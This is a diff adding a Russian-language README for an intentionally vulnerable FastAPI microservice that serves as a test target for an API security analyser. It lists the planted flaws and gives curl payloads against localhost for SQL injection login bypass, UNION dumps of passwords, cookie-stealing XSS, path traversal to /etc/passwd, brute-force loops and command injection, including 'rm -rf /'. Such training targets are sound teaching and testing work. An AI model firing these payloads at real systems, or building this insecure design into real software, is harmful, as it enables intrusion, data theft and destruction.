@@ -1,0 +1,365 @@
+# Vulnerable API Service 🚨
+
+> **ВНИМАНИЕ: ДАННЫЙ МИКРОСЕРВИС СОДЕРЖИТ НАМЕРЕННЫЕ УЯЗВИМОСТИ БЕЗОПАСНОСТИ!**  
+> **НЕ ИСПОЛЬЗУЙТЕ В PRODUCTION СРЕДЕ!**  
+> **ПРЕДНАЗНАЧЕН ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ И ТЕСТИРОВАНИЯ API АНАЛИЗАТОРА**
+
+## 📋 Обзор проекта
+
+Vulnerable API Service - это тестовый FastAPI микросервис, созданный специально для демонстрации различных уязвимостей безопасности в REST API. Сервис используется как тестовый объект для API анализатора безопасности.
+
+### 🎯 Цель проекта
+- Демонстрация распространенных уязвимостей API
+- Тестирование возможностей API анализатора безопасности
+- Образовательные цели для изучения безопасности API
+- Комплексное тестирование различных типов атак
+
+### 🏗️ Структура проекта
+```
+security-orchestrator-microservices/services/vulnerable-api-service/
+├── main.py                     # Главный файл FastAPI приложения
+├── requirements.txt            # Зависимости Python
+├── .env                       # Конфигурация с секретами
+├── src/
+│   ├── models.py              # Pydantic модели с уязвимостями
+│   ├── routes.py              # API маршруты с уязвимостями
+│   └── utils.py               # Утилиты с уязвимостями
+└── README.md                  # Этот файл
+```
+
+## 🚀 Запуск сервиса
+
+### Установка зависимостей
+```bash
+cd security-orchestrator-microservices/services/vulnerable-api-service
+pip install -r requirements.txt
+```
+
+### Запуск сервиса
+```bash
+python main.py
+```
+
+Сервис будет доступен по адресу: **http://localhost:8002**
+
+### Swagger документация
+- **Swagger UI**: http://localhost:8002/docs
+- **ReDoc**: http://localhost:8002/redoc
+
+## ⚠️ Реализованные уязвимости
+
+### 1. 🔓 Отсутствие аутентификации
+
+#### Admin endpoints без аутентификации
+- `GET /admin` - Административная панель
+- `GET /admin/users` - Управление пользователями  
+- `GET /admin/config` - Настройки системы
+- `GET /backend/management` - Backend управление
+
+**Тестирование:**
+```bash
+curl http://localhost:8002/admin
+curl http://localhost:8002/admin/config
+```
+
+### 2. 🔍 Unprotected Sensitive Endpoints
+
+#### API endpoints без аутентификации
+- `GET /api/v1/users` - Данные пользователей
+- `GET /api/v1/orders` - Финансовая информация
+- `GET /api/v1/payments` - Платежные данные (КРИТИЧЕСКАЯ УЯЗВИМОСТЬ!)
+
+**Тестирование:**
+```bash
+curl http://localhost:8002/api/v1/users
+curl http://localhost:8002/api/v1/payments
+```
+
+### 3. 🚫 Отсутствие HTTPS
+
+Сервис запускается только на HTTP (порт 8002), что делает данные уязвимыми для перехвата.
+
+### 4. 💉 SQL Injection
+
+#### Уязвимые endpoints
+- `GET /api/v1/users?user_id=1` - SQL injection через параметры
+- `POST /api/auth/login` - SQL injection в аутентификации
+- `GET /api/v1/search?query=test` - SQL injection в поиске
+
+**Payloads для тестирования:**
+```bash
+# Union-based SQL injection
+curl "http://localhost:8002/api/v1/users?user_id=1 UNION SELECT 1,2,3,4,5"
+
+# Blind SQL injection
+curl "http://localhost:8002/api/v1/search?query=test' AND (SELECT COUNT(*) FROM users) > 0 --"
+
+# Authentication bypass
+curl -X POST "http://localhost:8002/api/auth/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin'\" OR 1=1 --", "password": "anything"}'
+```
+
+### 5. 🌐 XSS (Cross-Site Scripting)
+
+#### Уязвимые endpoints
+- `GET /api/v1/echo?message=<script>alert('XSS')</script>` - Reflected XSS
+- `GET /api/v1/xss-test?payload=<img src=x onerror=alert('XSS')>` - XSS через параметры
+
+**Payloads для тестирования:**
+```bash
+# Basic XSS
+curl "http://localhost:8002/api/v1/echo?message=<script>alert('XSS')</script>"
+
+# Image XSS
+curl "http://localhost:8002/api/v1/xss-test?payload=<img src=x onerror=alert('XSS')>"
+```
+
+### 6. 🗂️ Information Disclosure
+
+#### Раскрытие конфиденциальной информации
+- `GET /debug/info` - Системная информация
+- `GET /debug/sql` - Содержимое базы данных
+- `GET /admin/config` - Секретные ключи и пароли
+- `GET /api/settings` - Настройки системы
+
+**Тестирование:**
+```bash
+curl http://localhost:8002/debug/info
+curl http://localhost:8002/debug/sql
+curl http://localhost:8002/admin/config
+```
+
+### 7. 🔗 Insecure Direct Object References (IDOR)
+
+#### Уязвимые endpoints
+- `GET /api/v1/user/{user_id}` - Доступ к данным любого пользователя
+- `GET /api/v1/order/{order_id}` - Доступ к данным любого заказа
+
+**Тестирование:**
+```bash
+curl http://localhost:8002/api/v1/user/1
+curl http://localhost:8002/api/v1/user/2
+curl http://localhost:8002/api/v1/order/1
+```
+
+### 8. ⏱️ Отсутствие Rate Limiting
+
+#### Login endpoint без ограничений
+- `POST /api/auth/login` - Brute force атаки
+
+**Тестирование:**
+```bash
+# Brute force атака
+for i in {1..100}; do
+  curl -X POST "http://localhost:8002/api/auth/login" \
+    -H "Content-Type: application/json" \
+    -d "{\"username\": \"admin\", \"password\": \"password$i\"}"
+done
+```
+
+### 9. 📁 Path Traversal
+
+#### Уязвимый endpoint
+- `GET /api/v1/download?filename=../../../etc/passwd` - Доступ к системным файлам
+
+**Тестирование:**
+```bash
+# Path traversal атака
+curl "http://localhost:8002/api/v1/download?filename=../../../etc/passwd"
+curl "http://localhost:8002/api/v1/download?filename=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+```
+
+### 10. 💻 Command Injection
+
+#### Уязвимые endpoints
+- `GET /api/v1/ping?host=google.com; ls -la` - Command injection
+- `GET /api/v1/execute?command=whoami` - Выполнение произвольных команд
+
+**Тестирование:**
+```bash
+# Command injection
+curl "http://localhost:8002/api/v1/ping?host=google.com; ls -la"
+curl "http://localhost:8002/api/v1/execute?command=whoami"
+```
+
+### 11. 🔄 Отсутствие API версионирования
+
+#### Endpoints без версий
+- `GET /api/users` - API без версии
+- `GET /api/products` - API без версии
+- `GET /api/orders` - API без версии
+
+### 12. 🗃️ Небезопасная сериализация
+
+#### Уязвимые endpoints
+- `POST /api/v1/process-json` - Pickle deserialization
+
+**Тестирование:**
+```bash
+curl -X POST "http://localhost:8002/api/v1/process-json" \
+  -H "Content-Type: application/json" \
+  -d '{"malicious": "data"}'
+```
+
+### 13. 📤 Небезопасная загрузка файлов
+
+#### Уязвимый endpoint
+- `POST /api/v1/upload` - Path traversal в filenames
+
+**Тестирование:**
+```bash
+curl -X POST "http://localhost:8002/api/v1/upload" \
+  -F "file=@malicious.txt" \
+  -F "filename=../../../etc/passwd"
+```
+
+## 🛡️ Критические уязвимости
+
+### 🔴 КРИТИЧЕСКАЯ: Раскрытие данных кредитных карт
+```bash
+curl http://localhost:8002/api/v1/payments
+```
+**Уязвимость:** Полные данные кредитных карт (номер, CVV) доступны без аутентификации.
+
+### 🔴 КРИТИЧЕСКАЯ: Раскрытие секретов системы
+```bash
+curl http://localhost:8002/admin/config
+```
+**Уязвимость:** Пароли, API ключи и секретные ключи доступны в plaintext.
+
+### 🔴 КРИТИЧЕСКАЯ: Command Injection
+```bash
+curl "http://localhost:8002/api/v1/execute?command=rm -rf /"
+```
+**Уязвимость:** Возможность выполнения произвольных команд в системе.
+
+## 📊 Статистика уязвимостей
+
+| Категория | Количество | Уровень риска |
+|-----------|------------|---------------|
+| Authentication Bypass | 5 | 🔴 Critical |
+| Information Disclosure | 8 | 🔴 Critical |
+| SQL Injection | 6 | 🔴 Critical |
+| XSS | 3 | 🟠 High |
+| Command Injection | 2 | 🔴 Critical |
+| Path Traversal | 2 | 🟠 High |
+| Missing Rate Limiting | 3 | 🟠 High |
+| **ИТОГО** | **29** | **🔴 Highly Vulnerable** |
+
+## 🧪 Примеры тестирования
+
+### Тестирование SQL Injection
+```bash
+# Basic SQL injection
+curl "http://localhost:8002/api/v1/users?user_id=1' OR '1'='1"
+
+# Union-based attack
+curl "http://localhost:8002/api/v1/search?query=test' UNION SELECT username,password,email,role FROM users --"
+```
+
+### Тестирование XSS
+```bash
+# Reflected XSS
+curl "http://localhost:8002/api/v1/echo?message=<script>alert(document.cookie)</script>"
+
+# Stored XSS (через тестовый payload endpoint)
+curl -X POST "http://localhost:8002/test/payload" \
+  -H "Content-Type: application/json" \
+  -d '{"payload": "<script>alert(\"XSS\")</script>"}'
+```
+
+### Тестирование Information Disclosure
+```bash
+# Раскрытие системной информации
+curl http://localhost:8002/debug/info | jq .
+
+# Раскрытие содержимого базы данных
+curl http://localhost:8002/debug/sql | jq .
+
+# Раскрытие настроек системы
+curl http://localhost:8002/api/settings | jq .
+```
+
+## 🔧 Технические детали
+
+### База данных
+- **Тип:** SQLite (vulnerable.db)
+- **Таблицы:** users, orders, payments
+- **Тестовые данные:** Включены с уязвимыми паролями
+
+### Настройки безопасности
+- **CORS:** Разрешены все источники (*)
+- **Аутентификация:** Отключена
+- **HTTPS:** Отключен
+- **Rate Limiting:** Отключен
+- **Security Headers:** Отключены
+
+### Логирование
+- **Уровень:** DEBUG (небезопасно для production)
+- **Выходные потоки:** Файл + консоль
+- **Чувствительные данные:** Логируются
+
+## ⚠️ Предупреждения безопасности
+
+1. **НЕ ЗАПУСКАЙТЕ** этот сервис в production среде
+2. **НЕ ИСПОЛЬЗУЙТЕ** реальные пароли и API ключи
+3. **ИЗОЛИРУЙТЕ** сервис от внешних сетей
+4. **МОНИТОРЬТЕ** активность при тестировании
+5. **УДАЛИТЕ** сервис после завершения тестирования
+
+## 🔍 Для API анализатора
+
+### Целевые endpoints для сканирования:
+1. **Admin endpoints:** `/admin`, `/admin/users`, `/admin/config`
+2. **API endpoints:** `/api/v1/*`, `/api/*`
+3. **Debug endpoints:** `/debug/*`
+4. **Test endpoints:** `/test/*`
+
+### Рекомендуемые проверки:
+- Отсутствие аутентификации
+- SQL injection в параметрах
+- XSS в user input
+- Information disclosure
+- Path traversal
+- Command injection
+- Missing security headers
+- CORS misconfiguration
+
+## 📚 Образовательные ресурсы
+
+### OWASP Top 10 API Security Risks:
+1. Broken Object Level Authorization
+2. Broken User Authentication  
+3. Excessive Data Exposure
+4. Lack of Resources & Rate Limiting
+5. Broken Function Level Authorization
+6. Mass Assignment
+7. Security Misconfiguration
+8. Injection
+9. Improper Assets Management
+10. Insufficient Logging & Monitoring
+
+### Дополнительные уязвимости для изучения:
+- Business Logic Flaws
+- Cryptographic Issues
+- Deserialization Vulnerabilities
+- Server-Side Request Forgery (SSRF)
+- XML External Entity (XXE) Injection
+
+## 🤝 Вклад в проект
+
+Этот проект предназначен для образовательных целей. При обнаружении новых уязвимостей:
+
+1. Добавьте описание в README
+2. Создайте соответствующий endpoint в routes.py
+3. Добавьте тестовые примеры
+4. Обновите статистику уязвимостей
+
+## 📄 Лицензия
+
+Этот проект создан исключительно для образовательных целей и тестирования API анализатора безопасности.
+
+---
+
+**⚠️ ПОМНИТЕ: Этот сервис содержит критические уязвимости безопасности!**
